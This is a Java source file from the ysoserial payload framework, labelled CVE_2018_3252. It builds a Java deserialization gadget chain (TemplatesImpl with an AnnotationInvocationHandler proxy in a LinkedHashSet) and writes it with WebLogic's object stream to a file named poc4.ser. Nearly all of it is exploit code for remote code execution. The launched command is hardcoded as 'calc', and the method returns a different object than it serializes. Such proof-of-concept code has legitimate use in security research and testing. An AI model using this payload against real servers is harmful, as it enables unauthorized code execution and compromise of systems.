package ysoserial.payloads;


import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

import java.io.FileOutputStream;
import weblogic.common.internal.WLObjectOutputStream;



public class CVE_2018_3252 implements ObjectPayload<Object> {




	public Object getObject(String command) throws Exception {

		final Object templates = Gadgets.createTemplatesImpl("calc");

		String zeroHashCodeStr = "f5a5a608";  // hashcode of zero

		HashMap hashMap = new HashMap();

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, hashMap);

		Reflections.setFieldValue(tempHandler, "type", Templates.class);

		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet hashSet = new LinkedHashSet(); // maintain order

		hashSet.add( templates );

		hashSet.add( proxy );

		hashMap.put(zeroHashCodeStr, templates); // swap in real object

		WLObjectOutputStream out = new WLObjectOutputStream(new FileOutputStream("poc4.ser"));

		out.writeObject( hashSet );

		return hashMap;
	}




	public static boolean isApplicableJavaVersion() {
	    JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CVE_2018_3252.class, args);
	}

}
